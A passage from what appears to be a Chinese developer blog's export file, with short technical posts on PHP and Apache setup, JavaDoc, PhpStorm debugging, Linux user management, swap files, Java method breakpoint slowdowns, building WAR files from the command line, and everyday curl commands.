<h1 id="二、搭建php运行环境"><a href="#二、搭建php运行环境" class="headerlink" title="二、搭建php运行环境"></a>二、搭建php运行环境</h1><p><strong>下载php</strong></p>
<p><a href="https://secure.php.net/downloads.php">https://secure.php.net/downloads.php</a></p>
<p><strong>编译安装php</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置编译项</span></span><br><span class="line">./configure --prefix=/opt/php --with-apxs2=/srv/apache2/bin/apxs --with-config-file-path=/usr/local/php/etc --with-mysql --with-pdo-mysql --with-mysql-sock=/var/mysql/mysql.sock</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编译</span></span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p>如果出现libxml2找不到的情况，执行以下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libxml2-dev</span><br></pre></td></tr></table></figure>

<p>如果编译时出现了virtual memory exhausted: Cannot allocate memory错误，这是因为服务器的内存不够</p>
<p>可临时通过增加虚拟内存来解决这个问题，参考<a href="http://blog.willowspace.cn/technology/2017/09/Linux%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/">增加虚拟内存的方法</a>。</p>
<p><strong>apache服务器支持php</strong></p>
<p>修改${apache_path}&#x2F;httpd.conf文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">mime_module</span>&gt;</span></span><br><span class="line">	AddType application/x-httpd-php .php</span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>apache服务器运行php脚本</strong></p>
<p>修改${apache_path}&#x2F;httpd.conf文件,</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">DocumentRoot &quot;/srv/$&#123;project_path&#125;&quot;</span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> &quot;/<span class="attr">srv</span>/$&#123;<span class="attr">project_path</span>&#125;&quot;&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在${project_path}下创建一个php文件测试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>重新apache服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;apache_path&#125;/bin/apachectl restart</span></span><br></pre></td></tr></table></figure>

<p>访问自定义配置的端口(此处为8000)，看到php相关信息的页面，成功了！</p>
<h1 id="三、apache2配置多个站点"><a href="#三、apache2配置多个站点" class="headerlink" title="三、apache2配置多个站点"></a>三、apache2配置多个站点</h1><h2 id="开启多站点配置"><a href="#开启多站点配置" class="headerlink" title="开启多站点配置"></a>开启多站点配置</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /srv/apche2/conf/httpd.conf</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 打开对应配置项</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Virtual hosts</span></span><br><span class="line">Include conf/extra/httpd-vhosts.conf  </span><br></pre></td></tr></table></figure>

<h2 id="配置多站点的根目录"><a href="#配置多站点的根目录" class="headerlink" title="配置多站点的根目录"></a>配置多站点的根目录</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- vim /srv/apche2/conf/httpd.conf --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 设置多站点的根目录 --&gt;</span></span><br><span class="line">DocumentRoot &quot;/srv/apache2/htdocs&quot;</span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> &quot;/<span class="attr">srv</span>/<span class="attr">apache2</span>/<span class="attr">htdocs</span>&quot;&gt;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 需要配置的多个站点必须置于该目录之下，否则无权访问 --&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="配置站点信息"><a href="#配置站点信息" class="headerlink" title="配置站点信息"></a>配置站点信息</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- vim /srv/apche2/conf/extra/httpd-vhosts.conf --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 一个VirtualHost节点即为一个站点 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:8000</span>&gt;</span></span><br><span class="line">    ServerAdmin webmaster@dummy-host.example.com</span><br><span class="line">    DocumentRoot &quot;/srv/apache2/htdocs/willowspace&quot;</span><br><span class="line">    ServerName willowspace.cn</span><br><span class="line">    ServerAlias www.willowspace.cn</span><br><span class="line">    ErrorLog &quot;logs/willowspace-error_log&quot;</span><br><span class="line">    CustomLog &quot;logs/willowspace-access_log&quot; common</span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="配置目录访问控制"><a href="#配置目录访问控制" class="headerlink" title="配置目录访问控制"></a>配置目录访问控制</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- vim /srv/apche2/conf/extra/httpd-vhosts.conf --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:8000</span>&gt;</span></span><br><span class="line">    ServerAdmin webmaster@dummy-host.example.com</span><br><span class="line">    DocumentRoot &quot;/srv/apache2/htdocs/assets&quot;</span><br><span class="line">    ServerName assets.willowspace.cn</span><br><span class="line">    ErrorLog &quot;logs/assets-error_log&quot;</span><br><span class="line">    CustomLog &quot;logs/assets-access_log&quot; common</span><br><span class="line">    <span class="comment">&lt;!-- 目录访问控制 +Indexes表示允许显示文件索引列表 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Directory</span> /<span class="attr">srv</span>/<span class="attr">apache2</span>/<span class="attr">htdocs</span>/<span class="attr">assets</span>&gt;</span></span><br><span class="line">        Options +Includes +Indexes</span><br><span class="line">        AllowOverride All</span><br><span class="line">        Order Deny,Allow</span><br><span class="line">        Allow from All</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>ops</tag>
        <tag>apache</tag>
        <tag>httpd</tag>
        <tag>php</tag>
        <tag>虚拟内存</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaDoc</title>
    <url>/technology/2017/05/JavaDoc%E5%B8%B8%E7%94%A8%E6%B3%A8%E9%87%8A/</url>
    <content><![CDATA[<h2 id="JavaDoc常用注释"><a href="#JavaDoc常用注释" class="headerlink" title="JavaDoc常用注释"></a>JavaDoc常用注释</h2><ul>
<li>@author         指定Java程序的作者</li>
<li>@version        指定源文件版本</li>
<li>@parameter  参数名及其意义</li>
<li>@return         返回值</li>
<li>@throws        异常类及抛出条件</li>
<li>@deprecated     引起不推荐使用的警告（标识一个方法已经不推荐使用了）</li>
<li>@see             超链 e.g. <a href="http://google.com/">http://google.com</a></li>
<li>@since          表示从那个版本起开始有了这个函数 </li>
<li>@note           表示注解，暴露给源码阅读者的文档 </li>
<li>{@value}       当对常量进行注释时，如果想将其值包含在文档中，则通过该标签来引用常量的值。</li>
<li>{@link 包.类#成员} 链接到某个特定的成员对应的文档中。</li>
</ul>
<h2 id="Intellj-IDEA中生成JavaDocs"><a href="#Intellj-IDEA中生成JavaDocs" class="headerlink" title="Intellj IDEA中生成JavaDocs"></a>Intellj IDEA中生成JavaDocs</h2><p>选择Tools-&gt;generate JavaDocs</p>
<p>注意一点，在Other command line arguments输入-encoding utf-8 -charset utf-8，这样可以保证中文的正常输出。</p>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>JavaDoc</tag>
        <tag>奇淫巧技</tag>
        <tag>代码规范</tag>
      </tags>
  </entry>
  <entry>
    <title>Php Storm进行断点调试</title>
    <url>/technology/2017/07/Php-Storm%E8%BF%9B%E8%A1%8C%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<p>本文介绍使用在php storm上进行断点调试</p>
<h3 id="安装xdebug"><a href="#安装xdebug" class="headerlink" title="安装xdebug"></a>安装xdebug</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装xdebug</span></span><br><span class="line">brew install php56-xdebug</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看安装结果</span></span><br><span class="line">php -i</span><br></pre></td></tr></table></figure>

<h3 id="php-storm设置"><a href="#php-storm设置" class="headerlink" title="php storm设置"></a>php storm设置</h3><ol>
<li><p>配置debug环境,注意端口号要与php.ini中配置的相同（下图为9000端口）</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1500902696029.png"></p>
</li>
<li><p>设置PHP Web Application</p>
<p>注意要设置下图中的Absolute path on the server</p>
</li>
</ol>
<p><img src="http://img.willowspace.cn/willowspace_2016/1500902961165.png"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1500903034350.png"></p>
<p>开始使用断点</p>
<h3 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h3><p><strong>Q1：断点进入时出现了Remote file path is not mapped to any file path in project</strong></p>
<p>这是由于PhpStorm不能确定哪个本地文件与debug监听的文件对应，应该不能定位本地的断点。</p>
<p>可以点击__Click to set up path mappings__按钮设置上文提到的Absolute path on the server，设置完毕即可解决该问题</p>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>Php-Storm</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux用户(组)及权限管理</title>
    <url>/technology/2017/09/Linux%E7%94%A8%E6%88%B7-%E7%BB%84-%E5%8F%8A%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1 id="用户-组-管理"><a href="#用户-组-管理" class="headerlink" title="用户(组)管理"></a>用户(组)管理</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新增用户</span></span><br><span class="line">useradd -s /bin/zsh -d /home/$user -m $user</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改用户密码</span></span><br><span class="line">passwd $user</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用户添加到新组</span></span><br><span class="line">usermod -a -G $newGroup $user</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看用户信息信息</span></span><br><span class="line">id $user</span><br><span class="line">uid=1001($user) gid=1001($user) groups=1001($user),33(www-data)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">给用户分配组</span></span><br><span class="line">gpasswd -a $user $group</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看用户所属组情况</span></span><br><span class="line">groups $userName</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把用户从组删除</span></span><br><span class="line">gpasswd -d $user $group</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除用户</span></span><br><span class="line">userdel -r $user</span><br></pre></td></tr></table></figure>

<h1 id="用户-组-权限管理"><a href="#用户-组-权限管理" class="headerlink" title="用户(组)权限管理"></a>用户(组)权限管理</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">给目录指定所属用户及所属用户组</span></span><br><span class="line">chown -R $user:$group $directory</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">给目录指定同组用户的权限</span></span><br><span class="line">chmod -R g+wrx $directory</span><br><span class="line">chmod -R g-wrx $directory</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>ops</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu下使用heirloom-mailx发送邮件</title>
    <url>/technology/2017/12/Ubuntu%E4%B8%8B%E4%BD%BF%E7%94%A8heirloom-mailx%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">install</span></span><br><span class="line">sudo apt-get install heirloom-mailx</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">configure</span></span><br><span class="line">vim /etc/s-nail.rc</span><br><span class="line">set from=$&#123;demo@qq.com&#125;</span><br><span class="line">set smtp=smtps://smtp.qq.com:465</span><br><span class="line">set smtp-auth-user=$&#123;demo@qq.com&#125;</span><br><span class="line">set smtp-auth-password=$&#123;password&#125;</span><br><span class="line">set smtp-auth=login</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">send mail</span></span><br><span class="line">echo &quot;mail content&quot; | mail -vs &quot;mail subject&quot; $&#123;target@mail.com&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>ops</tag>
        <tag>linux</tag>
        <tag>ubuntu</tag>
        <tag>monitor</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux虚拟内存管理</title>
    <url>/technology/2017/09/Linux%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1 id="管理虚拟内存"><a href="#管理虚拟内存" class="headerlink" title="管理虚拟内存"></a>管理虚拟内存</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先看一下当前内分分布</span></span><br><span class="line">free -m </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始分配虚拟内存</span></span><br><span class="line">mkdir /usr/img/ </span><br><span class="line">rm -rf /usr/img/swap</span><br><span class="line">dd if=/dev/zero of=/usr/img/swap bs=1024 count=2048000</span><br><span class="line">mkswap /usr/img/swap</span><br><span class="line">swapon /usr/img/swap</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看分配虚拟内存后的内存分布</span></span><br><span class="line">free -m</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用完干掉虚拟内存</span></span><br><span class="line">swapoff /usr/img/swap</span><br><span class="line">rm -f /usr/img/swap</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>虚拟内存</tag>
        <tag>linux</tag>
        <tag>内存管理</tag>
      </tags>
  </entry>
  <entry>
    <title>docker备份生产环境</title>
    <url>/technology/2017/01/docker%E5%A4%87%E4%BB%BD%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h2 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -it -v [local direcory]:/mnt $containerId /bin/zsh</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>ops</tag>
      </tags>
  </entry>
  <entry>
    <title>Java Method Breakpoints are evil</title>
    <url>/technology/2017/08/Java%20Method%20Breakpoints%20are%20evil/</url>
    <content><![CDATA[<h1 id="问题以及解决方案"><a href="#问题以及解决方案" class="headerlink" title="问题以及解决方案"></a>问题以及解决方案</h1><p>今天使用Intellj IDEA部署web项目时，spring web容器上下文(ContextLoader)加载非常慢，慢到完全启动一个项目需要耗时20分钟左右。</p>
<p>打开debug日志发现不停的加载注入的各种类，并且还有打印类中方法的详细信息。</p>
<p>最终定位问题是因为打开了<code>Java Method Breakpoints</code>（如下图），将其取消即可快速启动项目。<img src="http://img.willowspace.cn/willowspace_2016/1503176081426.png?imageMogr2/thumbnail/400" alt="img"></p>
<h1 id="探究原因"><a href="#探究原因" class="headerlink" title="探究原因"></a>探究原因</h1><p>Google上找到同样的<a href="https://blogs.sourceallies.com/2013/04/java-method-breakpoints-are-evil/">JAVA METHOD BREAKPOINTS ARE EVIL</a>（借用了这篇文章的标题，因为这个标题太符合<code>Java Method Breakpoints</code>了，就是邪恶），从其中找到了jetbrains team在jetbrains官网上给出的针对这个问题的回应参考<a href="https://intellij-support.jetbrains.com/hc/en-us/articles/206544799-Java-slow-performance-or-hangups-when-starting-debugger-and-stepping">原链接</a> (链接加载略慢)</p>
<p>然后继续查了几个搜索结果发现各大IDE厂商的bug list里都有报类似问题，参考<a href="https://bugs.eclipse.org/bugs/show_bug.cgi?id=20869">NetBeans Bug</a>、<a href="https://bugs.eclipse.org/bugs/show_bug.cgi?id=20869">Eclipse Bug</a></p>
<p>他们基本都说明了一点：这个问题的产生和<strong>JVM的设计</strong>有关系。</p>
<p>具体是指的JVM规定了虚拟机必须支持一组标准的调试API，这组标准的调试API指的是<a href="http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/">JPDA</a> (Java Platform Debugger Architecture)，JDPA是一组精心设计的接口与协议，所有的IDE基于JPDA进行封装，提供友好的用户调试接口。</p>
<p>当你设置断点时，IDE告诉<em>JVM’s Tool Interface</em>（JDPA的一部分）断点所属的源文件和行号，JVM找到这个断点在源文件中位置对应的编译后class文件中的位置，当JVM运行到一个断点，它将会中断当前执行的线程并且告诉IDE这个断点的源文件和行号，然后由IDE呈现定位给用户。</p>
<p>这是基本的行断点调试的机制，而<code>Java Method Breakpoints</code>是方法断点调试，它的机制与行断点调试略有不同，它将给方法注册进入&#x2F;退出事件，需要用到<code>MethodEntryRequest</code>这个类来进行注册。</p>
<p>然后我在JAVA官方找到了关于<a href="http://bugs.java.com/bugdatabase/view_bug.do?bug_id=6176614">JPDA性能问题的BUG清单</a>，其中有如下这样一段描述涉及到了<code>MethodEntryRequest</code>及其带来的性能问题</p>
<p><em>MethodEntryRequest and MethodExitRequest unreasonably slow down whole</em><br><em>performance. We use them to track calls to method in a particular class</em><br><em>or to any overriding methods. But it seems the performance slows down</em><br><em>for any method calls, not even to that particular class.</em></p>
<p>大致的意思就是说当用<code>MethodEntryRequest</code>来追踪方法调用时(可以理解为方法断点调试)，它将会让任何方法的调用性能都下降，而不只是特定的类(打了方法断点的那个类)。</p>
<p>找到这里基本上明了了，因为我打了一个方法断点没有放开，spring web context在进行依赖注入时构造各种各样的类需要调用大量的方法(构造方法、静态方法、解析方法等等)，每个方法的调用性能都下降了，所以整个项目加载起来自然就非常慢了。</p>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>JPDA</tag>
        <tag>JVM</tag>
        <tag>IDE</tag>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-CLI构建web程序</title>
    <url>/technology/2017/08/Java-CLI%E6%9E%84%E5%BB%BAweb%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<p>本文将介绍如何使用Java原生命令打包构建一个java web项目。</p>
<p>虽说现在有ant、maven、gradle等打包构建工具，可以很方便的完成打包构建目标，但是不妨看看他们是如何封装jdk命令完成打包构建的。</p>
<p>另一方面，古老的项目，没有使用高级的打包构建工具也没有IDE的情况下，也只能自己通过脚本来完成原生的打包任务了。</p>
<p>再者，java9来了，jdk更新了许多新的命令，重新回忆下传统命令也是好的。<img src="http://img.willowspace.cn/willowspace_2016/1504185367239.png"></p>
<h1 id="一、项目结构"><a href="#一、项目结构" class="headerlink" title="一、项目结构"></a>一、项目结构</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">project</span><br><span class="line">├── README.md</span><br><span class="line">├── lib #jar包目录</span><br><span class="line">│   ├── a.jar</span><br><span class="line">│   └── *.jar</span><br><span class="line">├── src #源码目录</span><br><span class="line">│   ├── package1</span><br><span class="line">│   └── package*</span><br><span class="line">└── web #web资源目录</span><br><span class="line">    ├── WEB-INF</span><br><span class="line">    │   └── web.xml</span><br><span class="line">    ├── js</span><br><span class="line">    ├── css    </span><br><span class="line">    └── index.html</span><br></pre></td></tr></table></figure>

<h1 id="二、编译源文件"><a href="#二、编译源文件" class="headerlink" title="二、编译源文件"></a>二、编译源文件</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd project</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建out目录，out目录下创建classes目录</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">out存放所有需要被打进war包的文件；out/classes存放所有编译好的字节码文件</span></span><br><span class="line">mkdir -p out/classes</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始编译源文件</span></span><br><span class="line">javac -g -cp &quot;./lib/*&quot; -d ./out/classes -encoding UTF8 $(find ./src -name &quot;*.java&quot;)</span><br></pre></td></tr></table></figure>

<p>javac为源文件的编译命令,其使用格式为：<code>javac &lt;options&gt; &lt;source files&gt;</code></p>
<p><code>-g</code> 默认情况下 <code>javac</code> 只生成行号和源文件信息，添加<code>g</code>参数将生成所有的debug信息，其中包括本地变量(spring参数注解等)。</p>
<p><code>-cp</code> 全拼是-classpath，可以指定源文件依赖的jar包或字节码文件</p>
<p><code>-d</code> 可以指定字节码文件的输出目录</p>
<p><code>$(find ./src -name &quot;*.java&quot;)</code> 指定的是待编译的源文件，这里使用了系统的find命令来进行通配src目录下的所有java文件</p>
<blockquote>
<p>更多javac命令细节参考<a href="http://docs.oracle.com/javase/8/docs/technotes/tools/windows/javac.html">java8 javac docs</a></p>
</blockquote>
<h1 id="三、按J2EE规范组织资源"><a href="#三、按J2EE规范组织资源" class="headerlink" title="三、按J2EE规范组织资源"></a>三、按J2EE规范组织资源</h1><p><a href="https://docs.oracle.com/cd/E13222_01/wls/docs90/webapp/configurewebapp.html">J2EE规范</a>规定了web资源文件、jar包文件、字节码文件等的组织结构如下，这也是最终war内部的目录结构</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">project/out</span><br><span class="line">├── WEB-INF</span><br><span class="line">│   ├── classes</span><br><span class="line">│   ├── lib</span><br><span class="line">│   └── web.xml</span><br><span class="line">├── js</span><br><span class="line">├── css    </span><br><span class="line">└── index.html</span><br></pre></td></tr></table></figure>

<p>开始按这个结构调整目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd project</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">复制web资源目录、jar包目录至out目录</span></span><br><span class="line">cp -r lib web/* out/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将字节码文件和jar包文件复制至WEB-INF目录下</span></span><br><span class="line">cd out</span><br><span class="line">mv lib classes WEB-INF/</span><br></pre></td></tr></table></figure>

<h1 id="四、打war包"><a href="#四、打war包" class="headerlink" title="四、打war包"></a>四、打war包</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd project/out</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打war包</span></span><br><span class="line">jar cvf ./project.war ./*</span><br></pre></td></tr></table></figure>

<blockquote>
<p>更多jar命令细节，参考<a href="http://docs.oracle.com/javase/8/docs/technotes/tools/windows/jar.html">java8 jar docs</a></p>
</blockquote>
<h1 id="五、FAQ"><a href="#五、FAQ" class="headerlink" title="五、FAQ"></a>五、FAQ</h1><h2 id="字节码文件目录中的文件找不到"><a href="#字节码文件目录中的文件找不到" class="headerlink" title="字节码文件目录中的文件找不到"></a>字节码文件目录中的文件找不到</h2><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>war包部署到web服务器启动时报文件(字节码文件目录中)找不到，这常常是由于源码目录中存放了非java文件，而我们上面说的步骤只是对源码目录进行了编译，没有处理这些非java文件，而这些文件确实被依赖，所以项目自然无法启动。</p>
<h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>举个实际场景如:使用mybatis时常会把ORM映射关系文件(xml)放在源码目录，如果不将映射文件移动到打包目录，打出来的war包就无法正常部署。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">project/src</span><br><span class="line">├── package1</span><br><span class="line">│   ├── mapping1.xml</span><br><span class="line">│   └── mapping*.xml   </span><br><span class="line">└── package*</span><br><span class="line">    └── *.java</span><br></pre></td></tr></table></figure>

<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>将非java文件从源码目录移至WEB-INF&#x2F;classes对应位置即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mv project/src/package1/* project/out/WEB-INF/classes/package1/</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">移动后的结构</span></span><br><span class="line">project</span><br><span class="line">├── src #源码目录</span><br><span class="line">│   ├── package1</span><br><span class="line">│   |	├── mapping1.xml</span><br><span class="line">│   |	└── mapping*.xml </span><br><span class="line">│   └── package*</span><br><span class="line">│   	└── *.java</span><br><span class="line">└── out #打包目录</span><br><span class="line">    ├── package1</span><br><span class="line">    |	├── mapping1.xml</span><br><span class="line">    |	└── mapping*.xml </span><br><span class="line">    └── package*</span><br><span class="line">    	└── *.class	</span><br></pre></td></tr></table></figure>

<h2 id="spring注解的参数无法解析"><a href="#spring注解的参数无法解析" class="headerlink" title="spring注解的参数无法解析"></a>spring注解的参数无法解析</h2><h3 id="原因-1"><a href="#原因-1" class="headerlink" title="原因"></a>原因</h3><p><code>javac</code>命令编译源文件的时候没有启了<code>g</code>参数，如果没有开启，spring的注解将被忽略</p>
<p>参考<a href="https://salonegupta.wordpress.com/2014/04/01/spring-annotations-and-javac-debug-mode/#more-5">Spring annotations and Javac debug mode</a></p>
<h3 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h3><p>开启<code>g</code>参数来编译源文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">javac -g ...</span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>build</tag>
        <tag>package</tag>
        <tag>java web</tag>
      </tags>
  </entry>
  <entry>
    <title>curl</title>
    <url>/technology/2017/01/curl/</url>
    <content><![CDATA[<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H &quot;Cookie:SESSION_ID=122F2F097414B9B8DA06E01F0025A5FF&quot; -F &quot;file=@/var/data/image.jpeg&quot; http://demo.cn/uploadFile</span><br></pre></td></tr></table></figure>

<h3 id="通过设置Cookie来模拟登陆调试接口"><a href="#通过设置Cookie来模拟登陆调试接口" class="headerlink" title="通过设置Cookie来模拟登陆调试接口"></a>通过设置Cookie来模拟登陆调试接口</h3><p>Cookie的获取可以通过在Chrome的Network里查看域名下任一一个请求的Head，复制Cookie即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X POST -H &quot;Host:&#123;hostName&#125;&quot; &quot;http://&#123;ip&#125;/&#123;uri&#125;&quot; -H &quot;Cookie:&#123;values&#125;&quot; -d &quot;&#123;parameters&#125;&quot; -i -v</span><br></pre></td></tr></table></figure>

<h3 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用curl</span></span><br><span class="line">curl -o $&#123;saved_filename&#125; $&#123;url&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用wget</span></span><br><span class="line">wget -O $&#123;saved_filename&#125; $&#123;url&#125;</span><br></pre></td></tr></table></figure>

<h3 id="测速"><a href="#测速" class="headerlink" title="测速"></a>测速</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -o /dev/null -s -w &#x27;%&#123;time_connect&#125;:%&#123;time_starttransfer&#125;:%&#123;time_total&#125;\n&#x27; &#x27;https://demo.cn&#x27;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>计时器</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>time_connect</td>
<td>建立到服务器的 TCP 连接所用的时间</td>
</tr>
<tr>
<td>time_starttransfer</td>
<td>在发出请求之后,Web 服务器返回数据的第一个字节所用的时间</td>
</tr>
<tr>
<td>time_total</td>
<td>完成请求所用的时间</td>
</tr>
<tr>
<td>time_namelookup</td>
<td>DNS解析时间,从请求开始到DNS解析完毕所用时间(记得关掉 Linux 的 nscd 的服务测试)</td>
</tr>
<tr>
<td>speed_download</td>
<td>下载速度，单位-字节每秒。</td>
</tr>
</tbody></table>
<h3 id="使用curl调试dwr接口"><a href="#使用curl调试dwr接口" class="headerlink" title="使用curl调试dwr接口"></a>使用curl调试dwr接口</h3><p>-i参数可现实response的相关头信息</p>
